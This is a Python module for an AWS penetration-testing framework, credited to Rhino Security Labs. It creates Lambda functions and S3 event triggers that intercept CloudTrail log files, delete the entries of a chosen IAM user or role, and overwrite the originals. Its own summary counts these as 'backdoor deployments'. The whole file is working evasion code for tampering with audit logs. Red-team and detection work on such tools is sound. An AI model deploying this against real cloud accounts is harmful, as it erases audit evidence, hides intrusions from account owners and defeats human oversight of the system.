#!/usr/bin/env python3
import argparse
from botocore.exceptions import ClientError
from copy import deepcopy
import subprocess
import random
import string
import os


module_info = {
    'name': 'lambda__intercept_cloudtrail_logs',

    'author': 'Spencer Gietzen of Rhino Security Labs',

    'category': 'EVADE',

    'one_liner': 'Creates a Lambda function and S3 event trigger to scrub CloudTrail logs of our own logs.',

    'description': 'This module creates a new Lambda function and an accompanying S3 event trigger that will trigger upon a new file being put into any buckets you specify. The Lambda function will determine if the file that was placed in the bucket is a CloudTrail log file, and if it is, it will download it, then remove any "AccessDenied" logs related to the Lambda function and any logs coming from the user/role name you specify. It will then re-upload that file ontop of the old one. Note: An IAM role that has the S3 GetObject and S3 PutObject permissions is required to be attached to the Lambda function when it is created. Note: If you specify multiple buckets in more than one region, a Lambda function will be created in each of those regions, because the Lambda function and corresponding S3 trigger must be in the same region.',

    'services': ['Lambda', 'S3', 'IAM'],

    'prerequisite_modules': ['iam__enum_users_roles_policies_groups'],

    'external_dependencies': [],

    'arguments_to_autocomplete': ['--buckets', '--user-name', '--role-name', '--cleanup'],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

parser.add_argument('--buckets', required=False, default=None, help='Comma-separated list of the S3 bucket(s) and their regions to target in the format bucket_name@region. An event trigger will be added to each bucket and for every item that is put into that bucket, our Lambda function will be invoked. These buckets should be where CloudTrail trails are saving their logs in the account.')
parser.add_argument('--user-name', required=False, default=None, help='The user name of the user that you want to remove logs for. The Lambda function will delete any logs from the CloudTrail output that originate from this user. One or both of either this argument or --role-name is required.')
parser.add_argument('--role-name', required=False, default=None, help='The role name of the role that you want to remove logs for. The Lambda function will delete any logs from the CloudTrail output that originate from this role. One or both of either this argument or --user-name is required.')
parser.add_argument('--cleanup', required=False, default=False, action='store_true', help='Run the module in cleanup mode. This will remove any known CloudTrail interceptors that the module added from the account.')


def main(args, pacu_main):
    session = pacu_main.get_active_session()

    ######
    args = parser.parse_args(args)
    print = pacu_main.print
    input = pacu_main.input
    fetch_data = pacu_main.fetch_data
    ######

    if args.cleanup:
        created_lambda_functions = []
        created_s3_triggers = []

        if os.path.isfile('./modules/{}/created-lambda-functions.txt'.format(module_info['name'])):
            with open('./modules/{}/created-lambda-functions.txt'.format(module_info['name']), 'r') as f:
                created_lambda_functions = f.readlines()
        if os.path.isfile('./modules/{}/created-s3-event-triggers.txt'.format(module_info['name'])):
            with open('./modules/{}/created-s3-event-triggers.txt'.format(module_info['name']), 'r') as f:
                created_s3_triggers = f.readlines()

        if created_lambda_functions:
            delete_function_file = True
            for function in created_lambda_functions:
                name = function.rstrip()
                print('  Deleting function {}...'.format(name))
                client = pacu_main.get_boto3_client('lambda', 'us-east-1')
                try:
                    client.delete_function(
                        FunctionName=name
                    )
                except ClientError as error:
                    code = error.response['Error']['Code']
                    if code == 'AccessDeniedException':
                        print('  FAILURE: MISSING NEEDED PERMISSIONS')
                    else:
                        print(code)
                    delete_function_file = False
                    break
            if delete_function_file:
                try:
                    os.remove('./modules/{}/created-lambda-functions.txt'.format(module_info['name']))
                except Exception as error:
                    print('  Failed to remove ./modules/{}/created-lambda-functions.txt'.format(module_info['name']))

        if created_s3_triggers:
            delete_s3_file = True
            for trigger in created_s3_triggers:
                bucket_name, bucket_region, trigger_id = trigger.rstrip().split('@')
                print('  Deleting S3 trigger {}...'.format(name))
                client = pacu_main.get_boto3_client('s3', bucket_region)
                try:
                    response = client.get_bucket_notification_configuration(
                        Bucket=bucket_name
                    )

                    print(response)

                    for i in range(0, len(response['LambdaFunctionConfigurations'])):
                        if response['LambdaFunctionConfigurations'][i]['Id'] == trigger_id:
                            del response['LambdaFunctionConfigurations'][i]
                            break

                    print(response)

                    client.put_bucket_notification_configuration(
                        Bucket=bucket_name,
                        NotificationConfiguration=response
                    )
                except ClientError as error:
                    code = error.response['Error']['Code']
                    if code == 'AccessDeniedException':
                        print('  FAILURE: MISSING NEEDED PERMISSIONS')
                    else:
                        print(code)
                    delete_s3_file = False
                    break
            if delete_s3_file:
                try:
                    os.remove('./modules/{}/created-s3-event-triggers.txt'.format(module_info['name']))
                except Exception as error:
                    print('  Failed to remove ./modules/{}/created-s3-event-triggers.txt'.format(module_info['name']))

        print('Completed cleanup mode.\n')
        return {'cleanup': True}

    if not args.buckets:
        print('  --buckets is required if you are not running in cleanup mode!')
        return

    if not args.user_name and not args.role_name:
        print('  One or both of either --user-name or --role-name is required if you are not running in cleanup mode!')
        return

    data = {'functions_created': 0, 'triggers_created': 0, 'successes': 0}

    created_resources = {'LambdaFunctions': [], 'S3Triggers': []}

    target_role_arn = input('  What role should be used? Note: The role should allow Lambda to assume it and have at least the S3 GetObject and S3 PutObject permissions. Enter the ARN now or just press enter to enumerate a list of possible roles to choose from: ')
    if not target_role_arn:
        if fetch_data(['IAM', 'Roles'], module_info['prerequisite_modules'][0], '--roles', force=True) is False:
            print('Pre-req module not run successfully. Exiting...')
            return False
        roles = deepcopy(session.IAM['Roles'])

        print('Found {} roles. Choose one below.'.format(len(roles)))
        for i in range(0, len(roles)):
            print('  [{}] {}'.format(i, roles[i]['RoleName']))
        choice = input('Choose an option: ')
        target_role_arn = roles[int(choice)]['Arn']

    # Import the Lambda function and modify the variables it needs
    with open('./modules/{}/lambda_function.py.bak'.format(module_info['name']), 'r') as f:
        code = f.read()

    if args.user_name:
        code = code.replace('USER_PLACEHOLDER', "if log_record['userIdentity']['type'] == 'IAMUser' and log_record['userIdentity']['userName'] == '{}':\n                    continue\n".format(args.user_name))
    else:
        code = code.replace('USER_PLACEHOLDER', '')

    if args.role_name:
        code = code.replace('ROLE_PLACEHOLDER', "if log_record['userIdentity']['type'] == 'AssumedRole' and log_record['userIdentity']['sessionContext']['sessionIssuer']['userName'] == '{}':\n                    continue".format(args.role_name))
    else:
        code = code.replace('ROLE_PLACEHOLDER', '')

    with open('./modules/{}/lambda_function.py'.format(module_info['name']), 'w+') as f:
        f.write(code)

    # Zip the Lambda function
    try:
        print('  Zipping the Lambda function...\n')
        subprocess.run('cd ./modules/{}/ && rm -f lambda_function.zip && zip lambda_function.zip lambda_function.py && cd ../../'.format(module_info['name']), shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as error:
        print('Failed to zip the Lambda function locally: {}\n'.format(error))
        return data

    with open('./modules/{}/lambda_function.zip'.format(module_info['name']), 'rb') as f:
        zip_file_bytes = f.read()

    regions = []
    buckets = []
    for bucket in args.buckets.split(','):
        bucket, region = bucket.split('@')
        regions.append(region)
        buckets.append(buckets)
    regions = list(set(regions))

    for region in regions:
        client = pacu_main.get_boto3_client('lambda', region)
        print('  Starting region {}...'.format(region))

        try:
            function_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(15))
            response = client.create_function(
                FunctionName=function_name,
                Runtime='python3.6',
                Role=target_role_arn,
                Handler='lambda_function.lambda_handler',
                Code={
                    'ZipFile': zip_file_bytes
                }
            )
            lambda_arn = response['FunctionArn']
            print('    Created Lambda function: {}'.format(function_name))
            data['functions_created'] += 1
            created_resources['LambdaFunctions'].append('{}@{}'.format(function_name, region))

            client = pacu_main.get_boto3_client('s3', region)

            for bucket in args.buckets.split(','):
                bucket_name, bucket_region = bucket.split('@')

                if region == bucket_region:
                    response = client.get_bucket_notification_configuration(
                        Bucket=bucket_name
                    )

                    print(response)

                    if 'LambdaFunctionConfigurations' not in response:
                        response['LambdaFunctionConfigurations'] = []

                    response['LambdaFunctionConfigurations'].append({
                        'Id': function_name,
                        'LambdaFunctionArn': lambda_arn,
                        'Events': [
                            's3:ObjectCreated:*'
                        ]
                    })

                    print(response)

                    client.put_bucket_notification_configuration(
                        Bucket=bucket_name,
                        NotificationConfiguration=response
                    )
                    print('    Created S3 event trigger for bucket: {}'.format(bucket_name))
                    data['triggers_created'] += 1

                    client = pacu_main.get_boto3_client('lambda', region)

                    active_aws_key = session.get_active_aws_key(pacu_main.database)

                    client.add_permission(
                        FunctionName=function_name,
                        StatementId=''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10)),
                        Action='lambda:InvokeFunction',
                        Principal='s3.amazonaws.com',
                        SourceArn='arn:aws:s3:::{}'.format(bucket_name),
                        SourceAccount=active_aws_key.account_id if active_aws_key.account_id else None
                    )

                    data['successes'] += 1
                    created_resources['S3Triggers'].append('{}@{}@{}'.format(bucket_name, region, function_name))
        except ClientError as error:
            code = error.response['Error']['Code']
            if code == 'AccessDeniedException':
                print('    FAILURE: MISSING NEEDED PERMISSIONS')
            else:
                print(code)

    if created_resources['LambdaFunctions']:
        with open('./modules/{}/created-lambda-functions.txt'.format(module_info['name']), 'w+') as f:
            f.write('\n'.join(created_resources['LambdaFunctions']))
    if created_resources['S3Triggers']:
        with open('./modules/{}/created-s3-event-triggers.txt'.format(module_info['name']), 'w+') as f:
            f.write('\n'.join(created_resources['S3Triggers']))

    return data


def summary(data, pacu_main):
    if data.get('cleanup'):
        return '  Completed cleanup of Lambda functions and S3 event triggers.'

    return '  Lambda functions created: {}\n  S3 event triggers created: {}\n  Successful backdoor deployments: {}\n'.format(data['functions_created'], data['triggers_created'], data['successes'])
